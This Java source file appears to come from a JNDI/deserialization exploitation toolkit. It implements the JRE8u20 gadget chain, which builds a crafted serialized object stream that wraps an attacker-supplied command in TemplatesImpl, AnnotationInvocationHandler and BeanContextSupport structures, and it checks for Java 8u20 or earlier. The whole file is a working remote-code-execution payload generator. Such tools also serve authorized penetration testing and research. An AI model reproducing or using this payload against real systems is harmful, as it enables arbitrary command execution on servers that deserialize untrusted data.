package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.JavaVersion;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.jre.*;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextChild;
import java.beans.beancontext.BeanContextSupport;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.util.HashMap;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;


@SuppressWarnings({"unused"})
@Dependencies
@Authors({"frohoff"})
public class JRE8u20 implements ObjectPayload<Object> {

    public static Object makeTemplates(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        Reflections.setFieldValue(templates, "_auxClasses", null);
        return templates;
    }

    public static TCObject makeHandler(HashMap map, Serialization ser) throws Exception {
        TCObject handler = new TCObject(ser) {
            public void doWrite(DataOutputStream out, HandleContainer handles) throws Exception {
                ByteArrayOutputStream byteout = new ByteArrayOutputStream();
                super.doWrite(new DataOutputStream(byteout), handles);
                byte[] bytes = byteout.toByteArray();
                out.write(bytes, 0, bytes.length - 1);
            }
        };
        TCClassDesc desc = new TCClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", (byte) 3);
        desc.addField(new TCClassDesc.Field("memberValues", Map.class));
        desc.addField(new TCClassDesc.Field("type", Class.class));
        TCObject.ObjectData data = new TCObject.ObjectData();
        data.addData(map);
        data.addData(Templates.class);
        handler.addClassDescData(desc, data);
        return handler;
    }

    public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception {
        TCObject    obj                         = new TCObject(ser);
        TCClassDesc beanContextSupportDesc      = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
        TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
        beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
        TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
        beanContextSupportData.addData(Integer.valueOf(1));
        beanContextSupportData.addData(handler);
        beanContextSupportData.addData(Integer.valueOf(0), true);
        beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
        TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
        beanContextChildSupportData.addData(obj);
        obj.addClassDescData(beanContextSupportDesc, beanContextSupportData, true);
        obj.addClassDescData(beanContextChildSupportDesc, beanContextChildSupportData);
        return obj;
    }

    public static boolean isApplicableJavaVersion() {
        JavaVersion v = JavaVersion.getLocalVersion();
        return (v != null && (v.major < 8 || (v.major == 8 && v.update <= 20)));
    }

    public Object getObject(String command) throws Exception {
        Serialization           ser       = new Serialization();
        Object                  templates = makeTemplates(command);
        HashMap<Object, Object> map       = new HashMap<Object, Object>();
        map.put("f5a5a608", templates);
        TCObject            handler           = makeHandler(map, ser);
        TCObject            linkedHashset     = new TCObject(ser);
        TCClassDesc         linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
        TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();
        TCClassDesc         hashsetDesc       = new TCClassDesc("java.util.HashSet");
        hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
        TCObject.ObjectData hashsetData = new TCObject.ObjectData();
        hashsetData.addData(makeBeanContextSupport(handler, ser));
        hashsetData.addData(Integer.valueOf(10), true);
        hashsetData.addData(Float.valueOf(1.0F), true);
        hashsetData.addData(Integer.valueOf(2), true);
        hashsetData.addData(templates);
        TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
        hashsetData.addData(proxy);
        linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
        linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
        ser.addObject(linkedHashset);

        if (JYsoMode) {
            ser.write(System.out);
            System.exit(0);
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ser.write(out);
        byte[] bytes = out.toByteArray();
        return bytes;
    }

}
